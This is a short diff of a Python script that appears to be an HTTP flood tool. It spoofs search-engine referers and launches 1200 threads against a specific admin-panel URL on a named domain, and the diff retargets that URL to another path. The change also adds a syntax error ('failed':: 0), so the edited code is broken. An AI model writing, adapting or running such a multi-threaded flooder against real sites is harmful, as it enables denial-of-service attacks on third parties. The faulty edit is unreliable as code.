@@ -15,7 +15,7 @@ headers_referers = [
     "http://www.usatoday.com/search/results?q=",
     "http://engadget.search.aol.com/search?q=",
 ]
-stats = {"good": {}, "failed": 0}
+stats = {"good": {}, "failed":: 0}
 lock = threading.Lock()
 def chek(url):
     while True:
@@ -37,7 +37,7 @@ def chek(url):
             with lock:
                 stats["failed"] += 1
 def start_threads():
-    target_url = "https://adminpanel.in.net/spider/login"
+    target_url = "https://adminpanel.in.net/spider/chito"
     for _ in range(1200):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
